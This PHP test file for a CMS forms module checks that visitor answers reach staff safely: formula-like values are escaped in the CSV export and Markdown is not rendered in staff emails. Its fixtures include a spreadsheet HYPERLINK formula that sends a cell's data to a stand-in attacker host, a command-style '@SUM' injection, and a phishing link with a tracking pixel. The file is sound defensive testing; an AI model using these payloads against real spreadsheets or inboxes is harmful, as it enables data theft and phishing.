<?php

declare(strict_types=1);

use Illuminate\Auth\GenericUser;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use LynxCms\Forms\Actions\SubmitForm;
use LynxCms\Forms\Models\Submission;
use LynxCms\Forms\Notifications\SubmissionReceived;
use LynxCms\Tests\Fixtures\Forms\QuoteForm;
use Workbench\App\Models\User;

/*
 * What visitors type reaches staff as plain text: never a formula in the CSV export, never a link,
 * image or formatting in the staff email.
 */

beforeEach(function (): void {
    Storage::fake('local');
    courseSite();
    lynx()->forms()->register(QuoteForm::class);
    DB::table('users')->insert(['id' => 1, 'name' => 'Admin', 'email' => 'admin@example.com', 'password' => 'x']);
});

function quoteFrom(string $name): Submission
{
    lynx()->run(SubmitForm::class, ['form' => 'quote', 'language' => 'pt', 'data' => [
        'type' => 'film', 'name' => $name, 'email' => 'ana@example.com', 'consent' => true,
    ]]);

    return Submission::query()->latest('id')->firstOrFail();
}

it('exports answers that look like formulas as text', function (string $answer, string $cell): void {
    quoteFrom($answer);
    $this->actingAs(new GenericUser(['id' => 1]));

    $csv = $this->get(route('lynx.admin.forms.export', 'quote'))->assertOk()->streamedContent();

    expect($csv)->toContain($cell);
})->with([
    'a formula' => ['=HYPERLINK("https://evil.example/?d="&B2,"Open")', '"\'=HYPERLINK(""https://evil.example/?d=""&B2,""Open"")"'],
    'a command' => ['@SUM(1+1)*cmd', "'@SUM(1+1)*cmd"],
    'a plus' => ['+351 912', "'+351 912"],
    'a negative number' => ['-5', ',-5'],
]);

it('sends staff the answers as plain text, not Markdown', function (): void {
    $submission = quoteFrom('[Your account is locked, sign in](https://evil.example) ![](https://evil.example/pixel.png) **urgent**');

    $html = (string) new SubmissionReceived($submission)->toMail(User::query()->findOrFail(1))->render();

    expect($html)->not->toContain('href="https://evil.example')
        ->and($html)->not->toContain('src="https://evil.example')
        ->and($html)->not->toContain('<strong>urgent</strong>')
        ->and($html)->toContain('[Your account is locked, sign in](https://evil.example)');
});
